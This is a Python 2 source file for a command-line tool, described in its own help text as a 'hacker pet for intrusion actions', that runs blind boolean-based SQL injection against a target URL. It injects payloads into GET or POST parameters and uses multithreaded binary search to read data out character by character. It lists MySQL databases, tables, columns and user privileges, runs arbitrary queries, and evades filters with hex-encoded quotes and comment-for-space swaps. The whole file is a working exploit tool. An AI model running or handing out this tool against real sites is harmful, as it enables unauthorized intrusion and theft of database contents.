import re
import sys
import argparse
from urllib  import quote_plus
from urllib2 import urlopen
from Queue     import Queue
from threading import Thread
from datetime  import datetime

p = argparse.ArgumentParser( description = 'Hacker pet for intrusion actions...' )
p.add_argument( '-u' , '--url'              , required = True          , help = 'url with possible GET data'      )
p.add_argument( '-p' , '--post'             , metavar = 'POST'         , help = 'to send POST data use this var'  )
p.add_argument( '-c' , '--cookie'           , metavar = 'COOKIE'       , help = 'cookie to send with POST or GET' )
p.add_argument( '-s' , '--string'           , required = True          , help = 'string to search on the page'    )
p.add_argument( '-v' , '--verbose'          , action = 'append_const' , const = 1, default = [],  help = 'how much verbose should be output' )
p.add_argument( '-a' , '--avoid'            , default = ''             , help = 'string of characters wich should be avoided in sql queries' )
p.add_argument( '-e' , '--error2false'      , action = 'store_const', const = True, help = 'if server return error identify this fact as false answer for SQL query' )
p.add_argument( '-E' , '--engine'           , default = 'mysql', choices = ['mysql', 'postgres'], help = 'engine of database'  )
p.add_argument( '-D' , metavar = 'DATABASE' , help = 'database to use' )
p.add_argument( '-T' , metavar = 'TABLE'    , help = 'table to use'    )
p.add_argument( '-U' , metavar = 'TABLE'    , help = 'username to use' )

g = p.add_mutually_exclusive_group( required=True )
g.add_argument( '-g' , '--get', choices = [ 'user', 'privs', 'dbs', 'tables', 'columns' ], help = 'wich object to retrieve from database' )
g.add_argument( '--sql', metavar = 'SQL_QUERY', help = 'this query will be retrieved from database' )

args = p.parse_args()

if args.post and '@' in args.post and '@' in args.url:
    print 'error: use hackage in GET or POST, not in both'
    exit( 1 )


class Searcher( object ):
    def __init__( self, **kargs ):
        self.__dict__.update( kargs )
        self.log_file = open( 'piglet.log', 'a' )
        self.log_file.write( '\n---------[%s]--------\n' % datetime.now() )

    def log( self, lvl, txt, newline = True ):
        if lvl <= self.log_lvl:
            s = txt + ( newline and '\n' or '' )
            self.log_file.write( s )
            sys.stdout.write( s )
            sys.stdout.flush()

    def test( self, sql ):
        url  = self.url.replace( '@', quote_plus( sql ) )
        post = self.post and self.post.replace( '@', quote_plus( sql ) )
        try:
            self.log( 2, '...testing url=%s POST=%s ' % ( url, post ), newline = False )
            html = urlopen( url, post ).read()
            self.log( 2, '--> %s' % ( self.sss in html ) )
            self.log( 3, '----html----\n%s\n----html----\n' % html )
            return self.sss in html
        except Exception, e:
            if args.error2false:
                self.log( 2, '--> error %s' % e )
                return False
            raise e



    def get_number( self, sql, lmin = None, lmax = None ):
        """ sql must return number as a result
        """

        if not lmin and not lmax:
            lmin, lmax = 0, 30  ## left and right bounds
            while self.test( '%s>%s' % ( sql, lmax ) ):
                lmax *= 2
                self.log( 3, '...lmax=%s' % lmax )


        th_num = self.th_num  ## alias...
        while lmax - lmin > 1:
            dl = 1.0 * ( lmax - lmin + 1 ) / ( th_num + 1 )

            bs = [ int( lmin + ( i + 1 ) * dl ) for i in xrange( th_num ) ] ## bounds
            bs = list( set( bs ) )  ## take unique bounds
            bs.sort()

            self.log( 3, '...bs start=%s' % bs )

            q = Queue()
            map( lambda i: q.put( i )    , xrange( len( bs ) ) )
            map( lambda i: q.put( None ) , xrange( th_num ) )

            def worker():
                while True:
                    i = q.get()
                    if i is None:
                        q.task_done()
                        break
                    bs[ i ] = ( bs[ i ], self.test( '%s>%s' % ( sql, bs[ i ] ) ) )
                    q.task_done()

            for i in xrange( th_num ):
                t = Thread( target = worker )
                t.start()

            q.join()

            self.log( 3, '...bs stop =%s' % bs )
            self.log( 3, '...before --> lmin=%s  lmax=%s' % ( lmin, lmax ) )
            if not bs[ 0 ][ 1 ]:
                lmax = bs[ 0 ][ 0 ]   ## correct only lmax
            elif bs[ -1 ][ 1 ]:
                lmin = bs[ -1 ][ 0 ]  ## correct only lmin
            else:
                lmin = bs[ 0 ][ 0 ]
                for b in bs[ 1: ]:
                    lmax = b[ 0 ]
                    if not b[ 1 ]:
                        break
                    lmin = lmax
            self.log( 3, '...after  --> lmin=%s  lmax=%s' % ( lmin, lmax ) )

        return lmax


    def get( self, sql, lmin = 32, lmax = 126 ):
        self.log( 0, 'find length of %s' % sql )
        l = self.get_number( 'length(%s)' % sql )
        self.log( 0, '...length=%s' % l )

        self.log( 0, '...', newline = False )
        res = ''
        for i in xrange( l ):
            c = self.get_number( 'ASCII(SUBSTRING(%s,%s,1))' % ( sql, i+1 ), lmin = lmin, lmax = lmax )
            res += chr( c )
            self.log( 0, chr( c ), newline = False )
        self.log( 0, '' )
        return res


class SQL:
    arr = { 'mysql': {}, 'postgres': {} }
    arr[ 'mysql' ][ 'user'        ] = "SELECT USER()"
    arr[ 'mysql' ][ 'dbs'         ] = "SELECT schema_name FROM `information_schema`.schemata LIMIT %(i)s,1"
    arr[ 'mysql' ][ 'dbs_cnt'     ] = "SELECT count(schema_name) FROM `information_schema`.schemata"
    arr[ 'mysql' ][ 'tables'      ] = "SELECT table_name FROM `information_schema`.tables WHERE table_schema='%(db)s' LIMIT %(i)s,1"
    arr[ 'mysql' ][ 'tables_cnt'  ] = "SELECT count(table_name) FROM `information_schema`.tables WHERE table_schema='%(db)s'"
    arr[ 'mysql' ][ 'columns'     ] = "SELECT column_name FROM `information_schema`.columns WHERE table_schema='%(db)s' AND table_name='%(tbl)s' LIMIT %(i)s,1"
    arr[ 'mysql' ][ 'columns_cnt' ] = "SELECT count(column_name) FROM `information_schema`.columns WHERE table_schema='%(db)s' AND table_name='%(tbl)s'"
    arr[ 'mysql' ][ 'privs'       ] = "SELECT privilege_type FROM `information_schema`.user_privileges WHERE grantee like '%(user)s' LIMIT %(i)s,1";
    arr[ 'mysql' ][ 'privs_cnt'   ] = "SELECT count(privilege_type) FROM `information_schema`.user_privileges WHERE grantee like '%(user)s'";

    def __init__( self, eng  ):
        self.eng = eng

    def my_hex( self, s ):
        l = map( lambda c: hex( ord( c ) )[ 2: ], s )
        return '0x' + ''.join( l )

    def prepare( self, s ):
        for c in args.avoid:
            if c == "'":
                r = re.compile( r"'((?:[^'\\]|\\.)*)'" )
                s = r.sub( lambda m: self.my_hex( m.group( 1 ) ), s )
            elif c == '`':
                s = s.replace( '`', '' )
            elif c == ' ':
                s = s.replace( ' ', '/**/' )

        return '(%s)' % s

    def __call__( self, name, **kargs ):
        s = self.arr[ self.eng ][ name ]

        #if self.eng == 'mysql':
        #    for k,v in kargs.iteritems():
        #        if type( v ) is str:
        #            kargs[ k ] = self.my_hex( v )

        return self.prepare( s % kargs )

s = Searcher( url = args.url,
              sss = args.string,
              post = args.post,
              th_num = 1,
              log_lvl = len( args.verbose ) )
sql = SQL( args.engine )


db   = args.D
tbl  = args.T
user = args.U and ( '%' + args.U + '%' )
get = args.get

if get == 'user':
    s.get( sql( 'user' ) )

elif get == 'dbs':
    s.log( 0, 'find count of databases...' )
    cnt = s.get_number( sql( 'dbs_cnt' ) )
    s.log( 0, '...count=%s' % cnt )
    for i in xrange( cnt ):
        s.get( sql( 'dbs', i = i ) )

elif get == 'tables':
    if not db:
        print 'error: use -D to specify database to search in'
        exit( 1 )

    s.log( 0, 'find count of tables in database "%s"...' % db )
    cnt = s.get_number( sql( 'tables_cnt', db = db ) )
    s.log( 0, '...count=%s' % cnt )

    for i in xrange( cnt ):
        s.get( sql( 'tables', i = i, db = db ) )

elif get == 'columns':
    if not db or not tbl:
        print 'error: use -D to specify database and -T to specify table'
        exit( 1 )

    s.log( 0, 'find count of columns in table "%s" of database "%s"...' % ( tbl, db ) )
    cnt = s.get_number( sql( 'columns_cnt', db = db, tbl = tbl ) )
    s.log( 0, '...count=%s' % cnt )

    for i in xrange( cnt ):
        s.get( sql( 'columns', i = i, db = db, tbl = tbl ) )

elif get == 'privs':
    if not user:
        print 'error: use -U to specify database user'
        exit( 1 )

    s.log( 0, 'find count of privileges for user "%s"...' % user )
    cnt = s.get_number( sql( 'privs_cnt', user = user ) )
    s.log( 0, '...count=%s' % cnt )

    for i in xrange( cnt ):
        s.get( sql( 'privs', i = i, user = user ) )

elif args.sql:
    s.get( sql.prepare( args.sql ) )
